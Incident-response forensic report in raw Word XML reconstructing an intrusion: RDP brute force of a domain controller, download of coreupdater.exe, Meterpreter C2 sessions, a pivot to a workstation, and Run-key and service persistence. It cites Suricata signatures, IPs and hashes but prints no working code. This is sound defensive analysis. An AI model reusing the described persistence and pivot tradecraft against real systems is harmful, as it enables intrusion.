        <w:t>Three independent sources agree: network capture (HTTP object hash, flows, ET alerts), disk (Amcache SHA1, Prefetch timing from step 3) and memory (netscan sockets). The time alignment (03:39:58 download, 03:40:49 execution / C2 open, 05:08:45 Run-key loader / second C2) holds after applying the constant ~1 h pcap offset. The 'Bind_API' + 'PE over raw TCP' pattern is the classic Metasploit reverse_tcp/reverse_https stage transfer; the encrypted, non-standard-TLS long-lived sessions are the interactive Meterpreter channels (session #1 later migrated into spoolsv.exe per F-015; session #2 is PowerShell PID 3316 per F-016). Volume upstream of session #1 (≈280 KB) is consistent with interactive commands plus possibly the loot.zip content (staged 03:46:18 host) — content not inspectable (encrypted), so exfiltration over C2 is only possible, not proven.</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02:39:58.411571</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1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_http.jsonl#156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</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suricata/case001.pcap/eve_fileinfo.jsonl#138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.412735</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | TCP 194.61.24.102:80 -&gt; 10.42.85.115:50864 | Potentially Bad Traffic | 1:joI6Y9tRe9v45mCCcFMHMI7rx+A= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#444</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suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:50.282950</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10.42.85.115:50875 | A Network Trojan was detected | 1:pcNgXsCjc/vxVdVvPl9FwJBoPrA= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#446</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suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.783080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server) | TCP 203.78.103.109:443 -&gt; 10.42.85.115:50972 | A Network Trojan was detected | 1:shvkq1T5rI2BCKSFPByeBaHUCDE= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#455</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>c:\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater.exe SHA1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c compiled=2010-04-14 22:06:53.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</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"50875", "Offset": "209519128050464", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#110</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>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"203.78.103.109", "ForeignPort": "443", "LocalAddr": "10.42.85.115", "LocalPort": "50972", "Offset": "209519140929552", "Proto": "TCPv4", "State": "ESTABLISHED"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.netscan.NetScan.jsonl#114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-018: Intrusion path on the wire: RDP brute force of DC Administrator from 194.61.24.102, then RDP DC (10.42.85.10) → DESKTOP-SDN1RPT matching the 4624 type 10 logon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evtx:security.evtx</w:t>
              <w:b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T1110.001, T1021.001, T1046</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 02:19:26.619607 → 2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>pcap-UTC times [host clock = +1 h]. 194.61.24.102 port-probes 10.42.85.10 (80/443) at 02:19:13 and opens a burst of ~50 RDP/TLS connections in &lt;1 s at 02:19:26 with RDP cookie 'nmap' (eve_rdp#1; ET SCAN RDP Connection Attempt from Nmap; eve_flow#491..). From 02:21:26 to 02:56:03 Suricata raises 198 'ET REMOTE_ACCESS MS Remote Desktop Administrator Login Request' alerts (RDP cookie mstshash=Administrator, eve_rdp#3 onward) from 194.61.24.102 to the DC — high-rate password guessing. At 02:23:41-02:24:06 the DC browses http://194.61.24.102/ and downloads /coreupdater.exe (eve_fileinfo#106), then opens Meterpreter sessions to 203.78.103.109:443 (02:25:18, 02:29:49, 02:56:38). Inbound to the workstation: RDP flow 10.42.85.10 → 10.42.85.115:3389 from 02:35:55.285 to 02:52:14.487 (875,256 B / 452,944 B, eve_flow#21411) plus a parallel 3389 flow 02:36:23-02:52:14 (eve_flow#31238). Host side: Security 4624 C137.LOCAL\Administrator at 03:36:22.98 host time (evtxecmd#39563) and RDP logon type 10 at 03:36:24 / logoff ~03:52:13 (F-006). No other host than the DC ever reaches 10.42.85.115 on 445/3389/5985; 10.42.85.115 opens no SMB/RDP/WinRM session to other internal hosts besides the DC (SYSVOL/NETLOGON/IPC$/FileShare only).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The network capture establishes the full chain: external attacker 194.61.24.102 brute-forced/logged into the DC over RDP, used the DC to stage the payload, then pivoted to DESKTOP-SDN1RPT over RDP with the domain Administrator account. Flow start/end (02:35:55-02:52:14 pcap) matches the host RDP session (03:36:24-03:52:13 host) within seconds after the 1 h offset, which independently corroborates the clock offset. Whether the brute force itself succeeded is shown only indirectly (subsequent interactive actions from the DC); DC logs are not in this collection.</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02:19:26.619607</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:3389 -&gt; 194.61.24.102:38100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:26.344228</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:3389 -&gt; 194.61.24.102:40046</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.285340</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.115</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.10:62514 -&gt; 10.42.85.115:3389 rdp state=closed bytes=875256/452944</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#21411</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.515604</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.115</w:t>
              <w:br/>
              <w:t>UDP 10.42.85.10:63121 -&gt; 10.42.85.115:3389 failed state=established bytes=283842/6695207</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#31238</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940653</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dest_ip=10.42.85.10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suricata/case001.pcap/eve_fileinfo.jsonl#106</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137.LOCAL\Administrator | LogonType 3 | LogonId: 0x842184 | AuthenticationPackageName: Kerberos | LogonProcessName: Kerberos | - | - (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</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C137\Administrator | LogonType 10 | LogonId: 0x857E73 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I found two attacker persistence mechanisms, both set up during the C137\Administrator RDP session.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(1) F-019, fileless: HKLM Run value "coreupdate", written 03:44:03 UTC. It starts a hidden PowerShell that runs base64 code stored in HKLM\Software\q9Z1bssi\JqxNhWJA, which matches the Metasploit registry_persistence template. It fired at ricksanchez's logon at 05:08:37 (Shell-Core 9707/9708, PowerShell 600/400), so the attacker gained a Domain Admin context.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(2) F-020: auto-start LocalSystem service "coreupdater" (C:\Windows\System32\coreupdater.exe), sources 7045 03:42:42 + SYSTEM hive + memory svclist (STOPPED). It has never fired because the last boot (01:24) came before the install. "nehgye" was a temporary getsystem service, already deleted, and is not persistence.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Ruled out as benign: scheduled tasks (TaskCache, TaskScheduler 106/140/141, memory), HKCU Run/RunOnce (OneDrive), AppInit_DLLs (empty), Active Setup, Print Monitors/Processors, BootExecute/SetupExecute, WMI 5861 (built-in SCM filter), hosts file (unchanged), Startup folders, and services written after boot (RDP, USB, FTK).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Recorded: T-017, IOCs I-011 (Run value) and I-012 (service), plus a note listing the ruled-out items.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-020: Persistence #2: auto-start LocalSystem service "coreupdater" (C:\Windows\System32\coreupdater.exe) still registered but not triggered yet (no reboot since install); "nehgye" was transient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services</w:t>
              <w:br/>
              <w:t>artifact:services (dissect)</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</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T1543.003, T1569.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537 → 2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SYSTEM hive: service "coreupdater", ImagePath C:\Windows\System32\coreupdater.exe, Start=Automatic (2), Type=Win32OwnProcess, ObjectName LocalSystem, key LastWrite 2020-09-19 03:42:42.676537 UTC (recmd_kroll_F_Services.csv#115; dissect services.jsonl#95). System 7045 at 03:42:42.6765372 "Name: coreupdater StartType: auto start Account: LocalSystem" (evtxecmd_0.csv#40866), same second as sc.exe execution (F-012). Memory (svclist, capture ~05:10): coreupdater SERVICE_AUTO_START / SERVICE_STOPPED, no PID (SvcList.jsonl#22). Service "nehgye" (7045 03:43:14.99, demand start, LocalSystem, evtxecmd_0.csv#40867) is no longer in the SYSTEM hive (reg_services/dissect_services return nothing) nor in memory svclist. Last boot is 01:24:04, before the install, so the service never started through SCM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>coreupdater is a Meterpreter payload (F-008/F-017). As a standalone EXE that does not implement the SCM protocol, it would be started at boot as SYSTEM and probably killed by SCM after ~30 s (error 1053), but long enough to open a C2 session (the usual Metasploit service-persistence behaviour). It is a dormant boot persistence that would have fired at the next reboot. "nehgye" matches the Meterpreter getsystem technique 1 (a temporary service that echoes to a named pipe and is deleted right away). It is not persistence. Sources: registry hive + EVTX + memory (3 independent sources).</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03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
